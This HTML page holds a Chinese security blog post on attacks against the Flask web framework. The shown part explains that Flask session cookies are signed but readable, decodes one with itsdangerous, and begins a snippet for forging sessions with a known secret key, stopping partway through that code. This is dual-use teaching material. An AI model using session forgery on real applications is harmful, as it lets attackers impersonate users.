

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, åšå®¢, ä¿¡æ¯å®‰å…¨">
  
    <meta name="description" content="SecMap ç³»åˆ—ä¹‹ Flaskï¼Œæœ¬ç¯‡ä»‹ç» flask ç›¸å…³çš„æ”»å‡»æ‰‹æ³•ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="SecMap - Flask">
<meta property="og:url" content="https://www.tr0y.wang/2022/05/16/SecMap-flask/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="SecMap ç³»åˆ—ä¹‹ Flaskï¼Œæœ¬ç¯‡ä»‹ç» flask ç›¸å…³çš„æ”»å‡»æ‰‹æ³•ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
<meta property="article:published_time" content="2022-05-16T19:00:00.000Z">
<meta property="article:modified_time" content="2025-04-15T14:01:31.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="SecMap">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
  
  
  
  <title>SecMap - Flask - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"ä¸¨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"ğŸŒ§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ç”Ÿå‘½çº¿
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                æ‘„å½±é›†
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SecMap - Flask"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-05-16 19:00" pubdate>
          2022å¹´5æœˆ16æ—¥ 19:00:00
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          19k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          119 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ç»éªŒæ€»ç»“"
        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
        aria-expanded="true"
      >
        ç»éªŒæ€»ç»“
        <span class="list-group-count">(85)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
        
        
          
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/31/2021/" title="2021 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2021/01/12/flag-in-2021/" title="2021ï¼Œæ¥ç«‹äº› flag å§"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021ï¼Œæ¥ç«‹äº› flag å§</span>
        </a>
      
    
      
      
        <a href="/2023/01/31/2022/" title="2022 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2022 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/03/15/2023/" title="2023 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 äº‘å—ä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 äº‘å—ä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2025/03/14/2024/" title="2024 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF æŒ‡åŒ—"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CSRF æŒ‡åŒ—</span>
        </a>
      
    
      
      
        <a href="/2017/06/07/CtfMiscStega/" title="CTF æ‚é¡¹ä¹‹éšå†™æœ¯"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CTF æ‚é¡¹ä¹‹éšå†™æœ¯</span>
        </a>
      
    
      
      
        <a href="/2020/09/14/DNS-1-basic/" title="DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ "
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ </span>
        </a>
      
    
      
      
        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

          
  
    
    
    
    <div class="category-sub row nomargin-x">
      <a class="category-subitem collapsed
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="è¿‡ç¨‹è®°å½•"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="false"
      >
        è¿‡ç¨‹è®°å½•
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SecMap - Flask</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2 ä¸ªæœˆå‰
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>SecMap ç³»åˆ—ä¹‹ Flaskï¼Œæœ¬ç¯‡ä»‹ç» flask ç›¸å…³çš„æ”»å‡»æ‰‹æ³•ã€‚</p>
<span id="more"></span>
<h2 id="ä»‹ç»">ä»‹ç»</h2>
<p>flask è¿˜æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„ Python Web æ¡†æ¶ï¼Œæˆ‘ä¸ªäººæ˜¯éå¸¸å–œæ¬¢çš„ã€‚</p>
<h2 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h2>
<p>flask æ˜¯å…¸å‹çš„è½»é‡çº§ Web æ¡†æ¶ï¼Œä»…ä¿ç•™äº†æ ¸å¿ƒåŠŸèƒ½ï¼šè¯·æ±‚å“åº”å¤„ç†å’Œæ¨¡æ¿æ¸²æŸ“ã€‚è¿™ä¸¤ç±»åŠŸèƒ½åˆ†åˆ«ç”± Werkzeugï¼ˆWSGIï¼‰å®Œæˆå’Œ jinja2 è´Ÿè´£ã€‚</p>
<p>jinja2 å°±ä¸ç”¨å¤šè¯´äº†ï¼Œä¹‹å‰çš„æ–‡ç« è¯´è¿‡ã€‚Werkzeug æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥å¤„ç† HTTP å’Œ WSGI çš„å·¥å…·åº“ï¼Œå¯ä»¥æ–¹ä¾¿çš„åœ¨ Python ä¸­å¤„ç† HTTP åè®®ç›¸å…³å†…å®¹ã€‚è¿™é‡Œé¡ºä¾¿æä¸€ä¸‹ï¼ŒWerkzeug ä¸æ˜¯ä¸€ä¸ª Web æœåŠ¡å™¨ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ª Web æ¡†æ¶ï¼Œè€Œæ˜¯ä¸€ä¸ªå·¥å…·åŒ…ï¼Œå®˜æ–¹çš„ä»‹ç»è¯´æ˜¯ä¸€ä¸ª WSGI å·¥å…·åŒ…ï¼Œå®ƒå¯ä»¥ä½œä¸ºä¸€ä¸ª Web æ¡†æ¶çš„åº•å±‚åº“ï¼Œå› ä¸ºå®ƒå°è£…å¥½äº†å¾ˆå¤š Web æ¡†æ¶éœ€è¦ç”¨åˆ°çš„åŸºæœ¬æ“ä½œï¼Œä¾‹å¦‚ Requestï¼ŒResponse ç­‰ç­‰ã€‚å¦‚æœæ©˜å‹ä»¬æ„Ÿå…´è¶£å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼ŒæŒ‰ç…§è¿™ä¸ªæ–‡æ¡£éå¸¸å®¹æ˜“ä¸Šæ‰‹ Werkzeugï¼ˆè§èµ„æ–™ 1ï¼‰ã€‚</p>
<p>flask è¿˜æ˜¯æ¯”è¾ƒæµè¡Œçš„ï¼Œæ•™ç¨‹ä¸€æŠ“ä¸€å¤§æŠŠï¼ŒåŸºç¡€çš„ä½¿ç”¨å°±ä¸å•°å—¦äº†ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹çœ‹ flask éƒ½æœ‰å“ªäº›æ”»å‡»é¢ã€‚</p>
<h2 id="æ”»å‡»æ€è·¯">æ”»å‡»æ€è·¯</h2>
<h3 id="å¸¸è§„å§¿åŠ¿">å¸¸è§„å§¿åŠ¿</h3>
<p>é¦–å…ˆï¼Œflask æœ¬èº«çš„æ¼æ´æœ¬ç¯‡å°±ä¸è¯¦ç»†ä»‹ç»äº†ï¼Œå¤§å®¶ä¸€æœ CVE éƒ½æœ‰ï¼ˆè§èµ„æ–™ 2ï¼‰ï¼Œç›®å‰æ¥çœ‹ï¼ˆ2022-05-06ï¼‰ï¼Œç‰ˆæœ¬ &gt;= <code>0.12.3</code> æ˜¯æ²¡æœ‰é€šç”¨æ¼æ´çš„ã€‚</p>
<p>å…¶æ¬¡ï¼Œä¸ºäº†é¿å…å†…å®¹é‡å¤ï¼Œé flask ç›´æ¥å¯¼è‡´çš„æ¼æ´ä¸å†æœ¬ç¯‡èŒƒå›´ä¸­ï¼Œä¾‹å¦‚ç›´æ¥æ‹¼æ¥ sql å¯¼è‡´ sql æ³¨å…¥ã€CSRFã€SSRF ç­‰ï¼Œè¿™äº›æ”»å‡»æ–¹å¼å¹¶éä½¿ç”¨ flask æ‰€å¯¼è‡´çš„ï¼Œæ¨èå»çœ‹ SecMap çš„å¯¹åº”ç³»åˆ—ï¼Œæ›´å®¹æ˜“ç†è§£ã€‚</p>
<h3 id="session-ä¿¡æ¯æ³„éœ²-ä¼ªé€ ">session ä¿¡æ¯æ³„éœ² &amp; ä¼ªé€ </h3>
<p>session çš„ä½œç”¨å¤§å®¶éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œå°±ä¸ç”¨ä»‹ç»äº†ã€‚</p>
<p>å®ƒçš„å¸¸è§å®ç°å½¢å¼æ˜¯å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªè¯·æ±‚çš„æ—¶å€™ï¼Œåç«¯ä¼šæ£€æŸ¥è¯¥è¯·æ±‚ä¸­æ˜¯å¦åŒ…å« sessionidï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¼šåˆ›é€ ä¸€ä¸ªå« sessionid çš„ cookieï¼Œç”¨äºåŒºåˆ†ä¸åŒçš„ sessionã€‚sessionid è¿”å›ç»™æµè§ˆå™¨ï¼Œå¹¶å°† sessionid ä¿å­˜åˆ°æœåŠ¡å™¨çš„å†…å­˜é‡Œé¢ï¼›å½“å·²ç»æœ‰äº† sessionidï¼ŒæœåŠ¡ç«¯ä¼šæ£€æŸ¥æ‰¾åˆ°ä¸è¯¥ sessionid ç›¸åŒ¹é…çš„ä¿¡æ¯ç›´æ¥ç”¨ã€‚</p>
<p>æ‰€ä»¥æ˜¾è€Œæ˜“è§ï¼Œsession å’Œ sessionid éƒ½æ˜¯åç«¯ç”Ÿæˆçš„ã€‚ä¸”ç”±äº session æ˜¯åç«¯è¯†åˆ«ä¸åŒç”¨æˆ·çš„é‡è¦ä¾æ®ï¼Œè€Œ sessionid åˆæ˜¯è¯†åˆ« session çš„å”¯ä¸€ä¾æ®ï¼Œæ‰€ä»¥ session ä¸€èˆ¬éƒ½ä¿å­˜åœ¨æœåŠ¡ç«¯é¿å…è¢«è½»æ˜“çªƒå–ï¼Œåªè¿”å›éšæœºç”Ÿæˆçš„ sessionid ç»™å®¢æˆ·ç«¯ã€‚å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå‡è®¾éœ€è¦å†’å……å…¶ä»–ç”¨æˆ·ï¼Œé‚£ä¹ˆå¿…é¡»èƒ½å¤ŸçŒœåˆ°å…¶ä»–ç”¨æˆ·çš„ sessionidï¼Œè¿™æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚</p>
<p>å¯¹äº flask æ¥è¯´ï¼Œå®ƒçš„ session ä¸æ˜¯ä¿å­˜åˆ°å†…å­˜é‡Œçš„ï¼Œè€Œæ˜¯ç›´æ¥æŠŠæ•´ä¸ª session éƒ½å¡åˆ° cookie é‡Œè¿”å›ç»™å®¢æˆ·ç«¯ã€‚é‚£ä¹ˆè¿™ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘å¯ä»¥ç›´æ¥æŒ‰ç…§æ ¼å¼ç”Ÿæˆä¸€ä¸ª session æ”¾åœ¨ cookie é‡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾¾åˆ°æ¬ºéª—åç«¯çš„æ•ˆæœã€‚</p>
<p>é˜…è¯»æºç å¯çŸ¥ï¼Œflask ç”Ÿæˆ session çš„æ—¶å€™ä¼šè¿›è¡Œåºåˆ—åŒ–ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol type="1">
<li>ç”¨ <code>json.dumps</code> å°†å¯¹è±¡è½¬æ¢æˆ json å­—ç¬¦ä¸²</li>
<li>å¦‚æœç¬¬ä¸€æ­¥çš„ç»“æœå¯ä»¥è¢«å‹ç¼©ï¼Œåˆ™ç”¨ zlib åº“è¿›è¡Œå‹ç¼©</li>
<li>è¿›è¡Œ base64 ç¼–ç </li>
<li>é€šè¿‡ secret_key å’Œ hmac ç®—æ³•ï¼ˆflask è¿™é‡Œçš„ hmac é»˜è®¤ç”¨ sha1 è¿›è¡Œ hashï¼Œè¿˜å¤šäº†ä¸€ä¸ª saltï¼Œé»˜è®¤æ˜¯ <code>cookie-session</code>ï¼‰å¯¹ç»“æœè¿›è¡Œç­¾åï¼Œå°†ç­¾åé™„åœ¨ç»“æœåé¢ï¼ˆç”¨ <code>.</code> æ‹¼æ¥ï¼‰ã€‚å¦‚æœç¬¬äºŒæ­¥æœ‰å‹ç¼©çš„è¯ï¼Œç»“æœçš„å¼€å¤´ä¼šåŠ ä¸Š <code>.</code> æ ‡è®°ã€‚</li>
</ol>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæœ€åä¸€æ­¥è§£å†³äº†ç”¨æˆ·ç¯¡æ”¹ session çš„å®‰å…¨é—®é¢˜ï¼Œå› ä¸ºåœ¨ä¸çŸ¥é“ secret_key çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ— æ³•ä¼ªé€ ç­¾åçš„ã€‚</p>
<p>æ‰€ä»¥è¿™ä¼šç›´æ¥å¯¼è‡´ 2 ä¸ªå¯èƒ½çš„å®‰å…¨é—®é¢˜ï¼š</p>
<ol type="1">
<li>æ•°å­—ç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œæ²¡æœ‰ä¿å¯†çš„ä½œç”¨ã€‚æ‰€ä»¥ flask çš„ session è§£å¼€ä¹‹åå¯ä»¥ç›´æ¥çœ‹åˆ°æ˜æ–‡ä¿¡æ¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®æ³„éœ²</li>
<li>å¦‚æœçŸ¥é“ secret_key é‚£ä¹ˆå¯ä»¥ä¼ªé€ ä»»æ„æœ‰æ•ˆçš„ sessionï¼ˆè¿™ä¸ªè¯´æ³•å¹¶ä¸å®Œå…¨å‡†ç¡®ï¼Œæ–‡æœ«çš„é˜²å¾¡é‚£ä¸€å°èŠ‚ä¼šè¯´æ˜åŸå› ï¼‰</li>
</ol>
<p>ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    user = session.get(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;Hacker&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Welcome, <span class="hljs-subst">&#123;user&#125;</span>!&#x27;</span><br><br><br>app.run()<br></code></pre></td></tr></table></figure></p>
<p>æ¯”å¦‚è¿™æ®µä»£ç ï¼Œæˆ‘ä»¬è®¿é—®ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ª sessionï¼š<code>eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA</code></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/b2403caf-03cd-4a2d-acb0-6e10646be004.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æŒ‰ç…§ç”Ÿæˆçš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“è§£å¼€ sessionï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">76</span>]: session = <span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA&quot;</span><br><br>In [<span class="hljs-number">77</span>]: <span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer, base64_decode, encoding<br><br>In [<span class="hljs-number">78</span>]: base64_decode(<span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9&quot;</span>)<br>Out[<span class="hljs-number">78</span>]: <span class="hljs-string">b&#x27;&#123;&quot;user&quot;:&quot;root&quot;&#125;&#x27;</span><br><br>In [<span class="hljs-number">79</span>]: base64_decode(<span class="hljs-string">&quot;YnkAHQ&quot;</span>)<br>Out[<span class="hljs-number">79</span>]: <span class="hljs-string">b&#x27;by\x00\x1d&#x27;</span><br><br>In [<span class="hljs-number">80</span>]: encoding.bytes_to_int(<span class="hljs-string">b&#x27;by\x00\x1d&#x27;</span>)<br>Out[<span class="hljs-number">80</span>]: <span class="hljs-number">1652097053</span><br><br>In [<span class="hljs-number">81</span>]: URLSafeTimedSerializer(<br>    ...:     <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span>, <br>    ...:     salt=<span class="hljs-string">&quot;cookie-session&quot;</span>, <br>    ...:     signer_kwargs=&#123;<span class="hljs-string">&quot;key_derivation&quot;</span>: <span class="hljs-string">&quot;hmac&quot;</span>&#125;<br>    ...: ).loads_unsafe(<span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA&quot;</span>)<br>Out[<span class="hljs-number">81</span>]: (<span class="hljs-literal">True</span>, &#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>&#125;)  <span class="hljs-comment"># ç¬¬ä¸€ä¸ªå€¼ä»£è¡¨ç­¾åæ˜¯å¦æœ‰æ•ˆ</span><br></code></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥å¦‚æœ session é‡Œæœ‰æ•æ„Ÿä¿¡æ¯ï¼Œé‚£ä¹ˆç›´æ¥å°±æ³„éœ²äº†ã€‚</p>
<p>æœ€åï¼Œå¦‚æœæåˆ° secret_keyï¼Œå¯ä»¥è¿™æ ·ä¼ªé€  sessionï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer<br><br><br>URLSafeTimedSerializer(<br>    <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span>,<br>    salt=<span class="hljs-string">&quot;cookie-session&quot;</span>,  <span class="hljs-comment"># è¿™æ˜¯é»˜è®¤çš„</span><br>    signer_kwargs=&#123;<span class="hljs-string">&quot;key_derivation&quot;</span>: <span 